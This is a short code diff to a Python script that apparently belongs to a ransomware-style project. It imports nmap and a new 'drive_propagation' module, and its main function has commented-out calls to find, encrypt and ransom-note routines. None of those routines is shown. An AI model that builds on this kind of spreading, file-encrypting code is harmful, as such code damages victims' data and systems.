@@ -3,6 +3,7 @@ import getpass
 import os
 import subprocess
 import time
+import drive_propagation
 
 import sys
 import nmap
@@ -204,6 +205,7 @@ def main():
     time.sleep(5)
     # find_file()
     # encrypt_file()
+
     message()
     # ransom_note()
     # show_ransom_note()
